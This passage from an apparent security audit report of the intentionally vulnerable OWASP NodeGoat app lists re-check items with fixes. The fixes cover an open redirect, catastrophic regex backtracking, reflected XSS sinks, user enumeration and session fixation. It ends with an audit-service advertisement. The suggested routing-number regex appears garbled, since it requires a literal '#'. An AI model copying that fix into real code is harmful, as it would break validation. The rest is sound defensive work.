   Confirm the change at `app/routes/index.js:70-74` is in place: Accept only a known set of destinations, or only a same-origin absolute path, and provide a default: const `LEARN_LINKS` = new Set(\["https://www.investopedia.com/retirement/401k-plans/" /\* ... \*/\]); const target = `LEARN_LINKS.has(req.query.url)` ? `req.query.url` : "`/dashboard`"; return `res.redirect(target)`; // or: const target = String(`req.query.url` || "`/dashboard`"); //     if (!/^\/(?!\/)/.test(target)) target = "`/dashboard`";
14. **Re-check: Bank routing validation regex backtracks catastrophically and can hang the single-threaded server**  
   Confirm the change at `app/routes/profile.js:58-63` is in place: Use the anchored, non-nested pattern and bound the length before testing; also keep the 500-page free of the raw error: if (typeof `bankRouting` `!==` "string" || `bankRouting.length` &gt; 20) { return `res.render`("profile", `{ updateError: "Bank Routing number must be 1-20 characters", ... }`); } const `regexPattern` = /^\[0-9\]+#\$/; if (!`regexPattern.test(bankRouting)`) { /\* re-render with error \*/ }
15. **Re-check: Remote page body is echoed back as `text/html`, giving script execution from any forged response**  
   Confirm the change at `app/routes/research.js:18-27` is in place: Do not render remote HTML in the app origin. Serve it as `text/plain` and drop the HTML wrapper, or escape it, e.g. render a template with `{{body}}` and enable swig autoescaping in `server.js:135-142`.
16. **Re-check: Login errors reveal whether a user name exists and there is no attempt throttling**  
   Confirm the change at `app/routes/session.js:53-118` is in place: Return `errorMessage` in both failure branches (`session.js:85` and 94) and add per-IP and per-account attempt limiting with a delay/lockout. Also store passwords hashed with bcrypt (`app/data/user-dao.js:25-30`) so a successful brute force is not the only cost.
17. **Re-check: Session id is not regenerated at login, so an attacker-planted session id becomes an authenticated session**  
   Confirm the change at `app/routes/session.js:104-118` is in place: Regenerate the session on login as the comment suggests, as signup already does.
18. **Re-check: Allocations path segment is reflected unescaped into a form action attribute**  
   Confirm the change at `app/views/allocations.html:15` is in place: Turn on swig autoescaping globally (`server.js:135-142`) and, defensively, render a numeric id: `userId: parseInt(userId, 10)` in `app/routes/allocations.js`. Enabling autoescape affects every template, so review them together.
19. **Re-check: Login page echoes the posted user name unescaped into an HTML attribute**  
   Confirm the change at `app/views/login.html:110` is in place: Enabling autoescape at `server.js:135-142` fixes this sink, but it must be done together with the memos/layout sinks: swig will then escape `{{ marked(doc.memo) }}` (`app/views/memos.html:31`) and `{{script}}` (`app/views/layout.html:126`), so those two need `| safe` where the value is already trusted/sanitized. Prefer not echoing the submitted user name at all: set `userName: ""` in both error renders (`app/routes/session.js:82-98`), as `displayLoginPage` already does.
20. **Re-check: Signup page echoes posted user name and email unescaped**  
   Confirm the change at `app/views/signup.html:75-102` is in place: Enable autoescape at `server.js:135-142` (and add `| safe` to the trusted `{{ marked(...) }}` and `{{script}}` sinks as noted for the other findings), or explicitly escape the echoed values. Do not re-render raw request values into attributes.

</details>

---

**Want this for your own code?** [Get an audit at yakiba.ai](https://yakiba.ai): one repository, one fixed price, a report like this one.

<sub>Code excerpts are from <a href="https://github.com/OWASP/NodeGoat">OWASP NodeGoat</a>, licensed under Apache-2.0. NodeGoat is an OWASP project; this audit is independent and not endorsed by OWASP.</sub>
